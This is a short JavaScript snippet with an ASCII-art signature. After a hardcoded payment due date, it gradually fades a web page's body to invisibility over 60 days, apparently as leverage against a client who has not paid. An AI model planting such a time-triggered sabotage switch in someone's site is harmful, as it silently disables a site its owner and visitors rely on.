// Script to adjust page opacity based on payment deadline
(function () {
  /**
   * Configuration Variables
   * Adjust these values as needed
   */
  const dueDate = new Date('2017-02-27'); // Payment due date
  const deadlineInDays = 60;             // Grace period in days

  /**
   * Calculate days passed since due date
   */
  const currentDate = new Date();
  const timeDifference = currentDate - dueDate; // Time difference in milliseconds
  const daysPassed = Math.floor(timeDifference / (1000 * 60 * 60 * 24)); // Convert to days

  /**
   * Adjust page opacity if overdue
   */
  if (daysPassed > 0) {
    const remainingDays = deadlineInDays - daysPassed;
    let opacity = remainingDays / deadlineInDays;

    // Ensure opacity is within valid range (0 to 1)
    opacity = Math.max(0, Math.min(1, opacity));

    // Apply opacity to the body if within range
    if (opacity >= 0 && opacity <= 1) {
      document.body.style.opacity = opacity;
    }
  }
})();

//     ______  __          __                _               
//    / ____ \/ /_  ____ _/ /_____________ _(_)_______  _____
//   / / __ `/ __ \/ __ `/ / ___/ ___/ __ `/ / ___/ _ \/ ___/
//  / / /_/ / / / / /_/ / / /  / /  / /_/ / (__  )  __/ /    
//  \ \__,_/_/ /_/\__,_/_/_/  /_/   \__,_/_/____/\___/_/     
//   \____/                                                  
  
                                                

